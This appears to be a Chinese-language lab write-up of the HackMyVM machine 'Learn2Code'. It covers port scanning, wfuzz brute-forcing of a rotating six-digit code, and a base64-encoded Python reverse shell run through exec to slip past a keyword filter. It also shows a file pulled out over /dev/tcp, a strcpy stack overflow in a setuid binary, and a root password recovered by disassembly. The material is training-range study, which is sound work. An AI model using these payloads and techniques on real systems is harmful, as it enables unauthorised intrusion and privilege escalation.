<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.58.164 -p-</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">27</span> <span class="number">14</span>:<span class="number">37</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">58.164</span>)</span><br><span class="line">Host is up (<span class="number">0.0019</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">65534</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span> ((Debian))</span><br><span class="line">|<span class="params">_http-title:</span> Access system</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.38</span> (Debian)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">0</span>E:EA:<span class="number">64</span>:<span class="number">0</span>E:<span class="number">8</span>F:AB (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.89</span> ms bogon (<span class="number">192.168</span>.<span class="number">58.164</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">9.44</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>只开放了80端口，那就直接进入web环节了</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p><img src="https://pic1.imgdb.cn/item/67c00984d0e0a243d406da07.png"><br>得到了一个奇怪的输入框<br>查看页面源代码，可以找到有一个<code>includes/js/functions.js</code>界面</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">check_code</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> params = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;action=check_code&quot;</span>, <span class="string">&quot;code=&quot;</span>+$(<span class="string">&#x27;#code&#x27;</span>).val());</span><br><span class="line">	php_ajax(params, <span class="string">&quot;includes/php/access.php&quot;</span>, <span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (response.<span class="built_in">indexOf</span>(<span class="string">&quot;wrong&quot;</span>) != <span class="number">-1</span>) &#123;</span><br><span class="line">			$(<span class="string">&#x27;.result&#x27;</span>).show();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$(<span class="string">&#x27;body&#x27;</span>).html(response);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">run_code</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> params = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="string">&quot;action=run_code&quot;</span>, <span class="string">&quot;code=&quot;</span>+$(<span class="string">&#x27;#custom_code&#x27;</span>).val());</span><br><span class="line">	php_ajax(params, <span class="string">&quot;includes/php/runcode.php&quot;</span>, <span class="keyword">function</span>(<span class="params">response</span>) &#123;</span><br><span class="line">		$(<span class="string">&#x27;#response_code&#x27;</span>).val(response);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>includes/js/custom_lib.js</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSHARP"><figure class="iseeu highlight /csharp"><table><tr><td class="code"><pre><span class="line"><span class="function">function <span class="title">php_ajax</span>(<span class="params"><span class="keyword">params</span>, php_file, response</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="keyword">params</span>.length; i+=<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">var</span> parametros = <span class="keyword">params</span>[i];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			parametros = parametros + <span class="string">&quot;&amp;&quot;</span> + <span class="keyword">params</span>[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">	xmlhttp.onreadystatechange = function() &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.readyState == <span class="number">4</span> &amp;&amp; <span class="keyword">this</span>.status == <span class="number">200</span>) &#123;</span><br><span class="line">			response(<span class="keyword">this</span>.responseText);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	xmlhttp.open(<span class="string">&quot;POST&quot;</span>, php_file, <span class="literal">true</span>);</span><br><span class="line">	xmlhttp.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">	xmlhttp.send(parametros);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个页面还设置了一个请求头<code>&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;</code><br>最后我们还能从页面源代码这里知道</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;input <span class="attribute">type</span>=<span class="string">&quot;number&quot;</span> <span class="attribute">class</span>=<span class="string">&quot;form-control text-center&quot;</span> <span class="attribute">min-length</span>=<span class="string">&quot;6&quot;</span> <span class="attribute">max-length</span>=<span class="string">&quot;6&quot;</span> <span class="attribute">id</span>=<span class="string">&quot;code&quot;</span> <span class="attribute">name</span>=<span class="string">&quot;code&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>
<p>code是一个六位数</p>
<p>第一个check_code()函数就是我们在首页校验code的函数，第二个run_code是什么呢，它运行后会去<code>includes/php/runcode.php</code>界面</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="regexp">/tmp]</span></span><br><span class="line"><span class="regexp">└─# curl http:/</span><span class="regexp">/192.168.58.164/includes</span><span class="regexp">/php/runcode</span>.php  </span><br><span class="line">Don<span class="string">&#x27;t be a cheater!</span></span><br></pre></td></tr></table></figure></div>
<p>这里有信息，肯定会利用到！<br>那现在最直接的做法就是爆破code了，生成所有的6位数作为字典，然后还要指定一个Content-type头<br>用wfuzz跑<br>这里好像因为会因为我的cpu限制自动终止了，所以我分批操作了一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wfuzz -c -z file,tmp.txt -u &quot;http://192.168.58.164/includes/php/access.php&quot; \</span><br><span class="line"><span class="code">    -X POST -d &quot;action=check_code&amp;code=FUZZ&quot; \</span></span><br><span class="line"><span class="code">    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="code">    --hw 1 -t 100  </span></span><br><span class="line"><span class="code"></span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.58.164/includes/php/access.php</span><br><span class="line">Total requests: 1000000</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                             </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000012774:   200        0 L      1 W        5 Ch        &quot;012773&quot;                                            </span><br><span class="line">zsh: killed     wfuzz -c -z file,tmp.txt -u &quot;http://192.168.58.164/includes/php/access.php&quot; -</span><br><span class="line"></span><br><span class="line"><span class="code">                                                                                                                     </span></span><br><span class="line"><span class="code">┌──(root㉿kakeru)-[~/tmp]</span></span><br><span class="line"><span class="code">└─# wfuzz -c -z file,tmp -u &quot;http://192.168.58.164/includes/php/access.php&quot; \ </span></span><br><span class="line"><span class="code">    -X POST -d &quot;action=check_code&amp;code=FUZZ&quot; \</span></span><br><span class="line"><span class="code">    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="code">    --hw 1  --hc 5 -t 100</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.58.164/includes/php/access.php</span><br><span class="line">Total requests: 87635</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                             </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000081488:   200        47 L     98 W       1543 Ch     &quot;993852&quot;                                            </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 87635</span><br><span class="line">Filtered Requests: 87634</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure></div>

<p> 找到了code<code>993852</code> 但是我在输入的时候还是错误，但是wfuzz刚刚是测的没问题，就说明这个code是在变化的，所以必须快速得到就登录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MARKDOWN"><figure class="iseeu highlight /markdown"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# wfuzz -c -z file,tmp -u &quot;http://192.168.58.164/includes/php/access.php&quot; \</span><br><span class="line"><span class="code">    -X POST -d &quot;action=check_code&amp;code=FUZZ&quot; \</span></span><br><span class="line"><span class="code">    -H &quot;Content-Type: application/x-www-form-urlencoded&quot; \</span></span><br><span class="line"><span class="code">    --hw 1  --hc 5 -t 100</span></span><br><span class="line"><span class="code"></span></span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/<span class="strong">__init__</span>.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"><span class="bullet">*</span> Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span><span class="strong">****</span></span><br><span class="line"></span><br><span class="line">Target: http://192.168.58.164/includes/php/access.php</span><br><span class="line">Total requests: 87000</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"><span class="section">ID           Response   Lines    Word       Chars       Payload                                             </span></span><br><span class="line"><span class="section">=====================================================================</span></span><br><span class="line"></span><br><span class="line">000032297:   200        47 L     98 W       1543 Ch     &quot;945296&quot;   </span><br></pre></td></tr></table></figure></div>
<p>登录之后有一个输入框让我们输入代码<br><img src="https://pic1.imgdb.cn/item/67c0194cd0e0a243d406feb7.png"><br>但是不知道要输入什么代码，我先测试一下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">Traceback (most recent <span class="keyword">call</span> <span class="keyword">last</span>):</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, <span class="built_in">line</span> <span class="number">1</span>, in <span class="symbol">&lt;module&gt;</span></span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, <span class="built_in">line</span> <span class="number">1</span></span><br><span class="line">    nc -<span class="keyword">e</span> bin/bash</span><br><span class="line">            ^</span><br><span class="line">SyntaxError: invalid <span class="keyword">syntax</span></span><br></pre></td></tr></table></figure></div>
<p>出现这种报错，说明是python代码，那就用python的反弹shell<br>我先是输入了一个正常的python反弹shell代码，提示Please, don’t use malicious code<br>说明过滤了某些值<br>把我们要执行的命令用base64编码，然后用exec函数执行<br><img src="https://pic1.imgdb.cn/item/67c01ad8d0e0a243d4070178.png"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">exec <span class="string">&quot;aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguNTguMTEiLDEyMzQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk7&quot;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234</span></span><br><span class="line"><span class="symbol">bash:</span> cannot set terminal process group (<span class="number">505</span>): <span class="title class_">Inappropriate</span> ioctl <span class="keyword">for</span> device</span><br><span class="line"><span class="symbol">bash:</span> no job control <span class="keyword">in</span> this shell</span><br><span class="line">www-data<span class="variable">@Learn2Code</span><span class="symbol">:/var/www/html/includes/php</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>成功拿到www-data的shell</p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>没有sudo权限，然后用find指令找了一下输入learner用户的文件，也没有发现，<br>上传linpeas.sh找一下敏感的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">[+] SGID</span><br><span class="line">[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation<span class="comment">#sudo-and-suid</span></span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root mail      19K Dec <span class="number"> 3 </span><span class="number"> 2017 </span>/usr/bin/dotlockfile</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root tty       15K May <span class="number"> 4 </span><span class="number"> 2018 </span>/usr/bin/bsd-write</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root shadow    31K Jul<span class="number"> 27 </span><span class="number"> 2018 </span>/usr/bin/expiry</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root shadow    71K Jul<span class="number"> 27 </span><span class="number"> 2018 </span>/usr/bin/chage</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root tty       35K Jan<span class="number"> 10 </span><span class="number"> 2019 </span>/usr/bin/wall</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root shadow    39K Feb<span class="number"> 14 </span><span class="number"> 2019 </span>/usr/sbin/unix_chkpwd</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root crontab   43K Oct<span class="number"> 11 </span><span class="number"> 2019 </span>/usr/bin/crontab</span><br><span class="line">-rwxr-sr-x<span class="number"> 1 </span>root ssh      315K Jan<span class="number"> 31 </span><span class="number"> 2020 </span>/usr/bin/ssh-agent</span><br><span class="line">-r-sr-sr-x<span class="number"> 1 </span>root www-data  17K Sep<span class="number"> 28 </span><span class="number"> 2020 </span>/usr/bin/MakeMeLearner</span><br></pre></td></tr></table></figure></div>
<p>发现有一个<code>/usr/bin/MakeMeLearner</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SWIFT"><figure class="iseeu highlight /swift"><table><tr><td class="code"><pre><span class="line">www<span class="operator">-</span>data<span class="meta">@Learn2Code</span>:<span class="regexp">/tmp$ file /</span>usr<span class="regexp">/bin/</span><span class="type">MakeMeLearner</span></span><br><span class="line"><span class="regexp">/usr/</span>bin<span class="regexp">/MakeMeLearner: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /</span>lib64<span class="regexp">/ld-linux-x86-64.so.2, BuildID[sha1]=bb387daabdaf0f68bfa1a29f8b8190c076dd6ad8, for GNU/</span><span class="type">Linux</span> <span class="number">3.2</span>.<span class="number">0</span>, not stripped</span><br></pre></td></tr></table></figure></div>
<p>这是个可执行文件，下载到本地看看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 4444 &gt; MakeMeLearner</span></span><br><span class="line"></span><br><span class="line">www-data@Learn2Code:<span class="regexp">/tmp$ cat /u</span>sr<span class="regexp">/bin/</span>MakeMeLearner &gt; <span class="regexp">/dev/</span>tcp<span class="regexp">/192.168.58.11/</span><span class="number">4444</span></span><br></pre></td></tr></table></figure></div>
<p>在本机用strings看了一下，好像有binbash，但是还是不能看出来在干嘛，用ida打开分析一下<br>main函数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CPP"><figure class="iseeu highlight /cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">76</span>]; <span class="comment">// [rsp+10h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+5Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">errx</span>(<span class="number">1</span>, <span class="string">&quot;please specify an argument\n&quot;</span>, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Change the &#x27;modified&#x27; variable value to &#x27;0x61626364&#x27; to be a learner&quot;</span>);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( v5 == <span class="number">1633837924</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0x3E8u</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0x3E8u</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again, you got 0x%08x\n&quot;</span>, v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里就是利用strcpy的栈溢出，这里的pwn就是我的知识盲区了，只能看wp了，后面web学好了会继续学pwn的知识<br>执行一下这个程序</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">www-data@Learn2Code:/tmp$ /usr/bin/MakeMeLearner <span class="number">1633837924</span></span><br><span class="line">Change <span class="keyword">the</span> <span class="string">&#x27;modified&#x27;</span> <span class="built_in">variable</span> <span class="built_in">value</span> <span class="built_in">to</span> <span class="string">&#x27;0x61626364&#x27;</span> <span class="built_in">to</span> be <span class="keyword">a</span> learnerTry again, you got <span class="number">0x00000000</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># rax2 -s 0x61626364</span></span><br><span class="line">abcd  </span><br></pre></td></tr></table></figure></div>
<p>它这里返回的消息是想要abcd<br>这里第一种方案是随便写点东西，发现在很长的时候就不是you got 0x00000000了，然后再找到一个边界值，最后哦输入abcd就能符合条件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">hange <span class="keyword">the</span> <span class="string">&#x27;modified&#x27;</span> <span class="built_in">variable</span> <span class="built_in">value</span> <span class="built_in">to</span> <span class="string">&#x27;0x61626364&#x27;</span> <span class="built_in">to</span> be <span class="keyword">a</span> learnerTry again, you got <span class="number">0x00666164</span></span><br><span class="line">&lt;flkasjdlkhjsdhhuihsjfnkjadsnfkjdhjskkccsksdfksdjkfhasdkfajdfasdfssdfasds   </span><br><span class="line">Change <span class="keyword">the</span> <span class="string">&#x27;modified&#x27;</span> <span class="built_in">variable</span> <span class="built_in">value</span> <span class="built_in">to</span> <span class="string">&#x27;0x61626364&#x27;</span> <span class="built_in">to</span> be <span class="keyword">a</span> learnerTry again, you got <span class="number">0x00000000</span></span><br><span class="line">&lt;kljflkasjdlkhjsdhhuihsjfnkjadsnfkjdhjskkccsksdfksdjkfhasdkfajdfasdfssdfasdsabcd</span><br><span class="line">Change <span class="keyword">the</span> <span class="string">&#x27;modified&#x27;</span> <span class="built_in">variable</span> <span class="built_in">value</span> <span class="built_in">to</span> <span class="string">&#x27;0x61626364&#x27;</span> <span class="built_in">to</span> be <span class="keyword">a</span> learnerTry again, you got <span class="number">0x64636261</span></span><br><span class="line">&lt;lkasjdlkhjsdhhuihsjfnkjadsnfkjdhjskkccsksdfksdjkfhasdkfajdfasdfssdfasdsdcba</span><br><span class="line">learner@Learn2Code:/tmp$ </span><br></pre></td></tr></table></figure></div>
<p>找到边界值之后，根据回显输入abcd，发现大小端是反的，所以输入dcba，然后就成功拿到learner的shell了</p>
<p>第二种方法是用msf做，先用msf-pattern_create生成一个很长的pattern，然后在gdb中传给这个程序，让他的内存炸，然后再去用msf-pattern_offset找到精确的偏移量</p>
<p>然后learner这个用户也有一个程序，名称是密码<br>然后再用ida看看</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; Attributes: bp-based frame</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; int __fastcall main(int argc, const char **argv, const char **envp)</span></span><br><span class="line"><span class="meta">public</span> main</span><br><span class="line">main proc <span class="built_in">near</span></span><br><span class="line"></span><br><span class="line">var_18= <span class="built_in">qword</span> <span class="built_in">ptr</span> -<span class="number">18h</span></span><br><span class="line">var_10= <span class="built_in">qword</span> <span class="built_in">ptr</span> -<span class="number">10h</span></span><br><span class="line">var_8= <span class="built_in">qword</span> <span class="built_in">ptr</span> -<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">20h</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">rax</span>, aNoi98ho   <span class="comment">; &quot;NOI98hO&quot;</span></span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_8], <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">rax</span>, aIhj       <span class="comment">; &quot;Ihj&quot;</span></span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_10], <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">rax</span>, aJj        <span class="comment">; &quot;)(Jj&quot;</span></span><br><span class="line"><span class="keyword">mov</span>     [<span class="built_in">rbp</span>+var_18], <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">lea</span>     <span class="built_in">rdi</span>, s          <span class="comment">; &quot;If you are a learner, i&#x27;m sure you know&quot;...</span></span><br><span class="line"><span class="keyword">call</span>    _puts</span><br><span class="line"><span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">leave</span></span><br><span class="line"><span class="keyword">retn</span></span><br><span class="line"><span class="comment">; &#125; // starts at 1135</span></span><br><span class="line">main endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里就直接给出密码了<code>NOI98hOIhj)(Jj</code><br>输入密码就拿到rootshell了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">learner<span class="variable">@Learn2Code</span><span class="symbol">:/home/learner</span><span class="variable">$ </span>su - root     </span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line">root<span class="variable">@Learn2Code</span><span class="symbol">:~</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>学到了用wfuzz爆破值，然后python的反弹shell应用<br>python过滤关键字，但是可以执行命令的时候通用方法–exec .decode(‘base64’)<br>了解pwn的简单栈溢出，了解pwn的一些基本原理</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
